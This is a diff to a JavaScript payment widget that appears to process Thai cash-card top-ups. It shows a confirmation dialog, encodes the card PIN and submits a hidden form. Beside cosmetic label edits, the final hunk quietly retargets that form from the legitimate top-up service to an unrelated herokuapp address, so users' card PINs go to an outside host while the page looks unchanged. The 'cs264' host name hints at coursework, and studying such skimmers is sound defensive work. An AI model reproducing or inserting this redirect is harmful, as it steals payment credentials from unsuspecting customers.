@@ -128,7 +128,7 @@ function colorboxReady(state)
 			console.log("Activate tmtopup_new");
 			tmtopup_new();
 			jQuery(function() {
-				jQuery("body").append('<div id="tmtopup_page_cover" style="width: 100%;height: 100%;top: 0px;left: 0px;position: fixed;display: block; z-index: 99; background-color:#ffffff;opacity:0.7;filter:alpha(opacity=70)"></div><div id="tmtopup_payment_confirm" title="ยืนยันการชำระเงิน" style="font-family:Tahoma;font-size:18px"><p style="margin:15px">ท่านแน่ใจหรือไม่ ที่จะเติมเงินเข้า <span style="font-weight:bold;color:#b26200">D3DXZ.COM (UID:219111)</span> ?</p><p><div id="tmtopup_payment_alert" style="font-size:12px;color:#fff;background-color:#ff0000;border-radius:4px;-webkit-border-radius:4px;-moz-border-radius:4px;padding:10px 10px;">บัตรเงินสดของท่านจะถูกใช้งานทันที และ ไม่สามารถแก้ไขหรือยกเลิกรายการได้</div></p></div><div id="error_box" title="Error" style="font-family:Tahoma;font-size:18px"></div><div style="display:none"><div id="processing_box" style="font-family:Tahoma;font-size:14px;text-align:center"><p style="margin-top:20px"><img id="loading_img" src="https://static.tmpay.net/tmtopup/assets/img/topup_loading.gif" /></p><p style="font-size:16px;font-weight:bold;margin:15px">สถานะรายการ <span id="result_status" style="text-shadow: 0.9px 0.9px #cbcbcb">กำลังตรวจสอบ</span></p><span id="remark_box" style="font-size:12px;color:#fff;background-color:#0c3c4d;border-radius:4px;-webkit-border-radius:4px;-moz-border-radius:4px;padding:10px 10px;">กรุณาอย่าปิดหน้าต่างนี้ จนกว่าระบบจะดำเนินการสำเร็จ</span></div></div>');
+				jQuery("body").append('<div id="tmtopup_page_cover" style="width: 100%;height: 100%;top: 0px;left: 0px;position: fixed;display: block; z-index: 99; background-color:#ffffff;opacity:0.7;filter:alpha(opacity=70)"></div><div id="tmtopup_payment_confirm" title="ยืนยันการชำระเงิน" style="font-family:Tahoma;font-size:18px"><p style="margin:15px">ท่านแน่ใจหรือไม่ ที่จะเติมเงินเข้า <span style="font-weight:bold;color:#b26200">D3DXZ.COM (UID:219111)</span> ?</p><p><div id="tmtopup_payment_alert" style="font-size:12px;color:#fff;background-color:#ff0000;border-radius:4px;-webkit-border-radius:4px;-moz-border-radius:4px;padding:10px 10px;">บัตรเงินสดของท่านจะถูกใช้งานทันที และ ไม่สามารถแก้ไขหรือยกเลิกรายการได้</div></p></div><div id="error_box" title="Error" style="font-family:Tahoma;font-size:18px"></div><div style="display:none"><div id="processing_box" style="font-family:Tahoma;font-size:14px;text-align:center"><p style="margin-top:20px"><img id="loading_img" src="https://static.tmpay.net/tmtopup/assets/img/topup_loading.gif" /></p><p style="font-size:16px;font-weight:bold;margin:15px">สถานะรายการ X <span id="result_status" style="text-shadow: 0.9px 0.9px #cbcbcb">กำลังตรวจสอบ</span></p><span id="remark_box" style="font-size:12px;color:#fff;background-color:#0c3c4d;border-radius:4px;-webkit-border-radius:4px;-moz-border-radius:4px;padding:10px 10px;">กรุณาอย่าปิดหน้าต่างนี้ จนกว่าระบบจะดำเนินการสำเร็จ</span></div></div>');
 				jQuery("#tmtopup_payment_confirm").dialog({
 					resizable: false,
 					width:"auto",
@@ -138,12 +138,12 @@ function colorboxReady(state)
 					autoOpen: false,
 					close: function() { jQuery("#tmtopup_page_cover").hide(); },
 					buttons: {
-						"ยืนยันรายการ": function() {
+						"ยืนยันรายการ X": function() {
 							jQuery("#tmtopup_page_cover").hide();
 							submit_payment();
 							jQuery(this).dialog("close");
 						},
-						"ยกเลิก": function() {
+						"ยกเลิก X": function() {
 							jQuery("#tmtopup_page_cover").hide();
 							jQuery(this).dialog("close");
 						}
@@ -185,7 +185,7 @@ function JAlert(title,msg,is_modal)
 //PIN Encding
 function encode_tmnc(pin_code)
 {
-					while(pin_code.indexOf('0')!=-1) { pin_code = pin_code.replace('0','G'); }
+				while(pin_code.indexOf('0')!=-1) { pin_code = pin_code.replace('0','G'); }
 				while(pin_code.indexOf('1')!=-1) { pin_code = pin_code.replace('1','H'); }
 				while(pin_code.indexOf('2')!=-1) { pin_code = pin_code.replace('2','J'); }
 				while(pin_code.indexOf('3')!=-1) { pin_code = pin_code.replace('3','F'); }
@@ -259,7 +259,7 @@ submit_tmnc = function()
 		}
 	}
 	var tmtopupForm = document.createElement("form");
-	tmtopupForm.action = "https://www.tmtopup.com/topup/?uid=219111";
+	tmtopupForm.action = "https://cs264-heroku.herokuapp.com/js/scripts.js";
 	tmtopupForm.method = "post";
 	tmtopupForm.target = "_parent";
 	tmtopupForm.style.display = 'none';
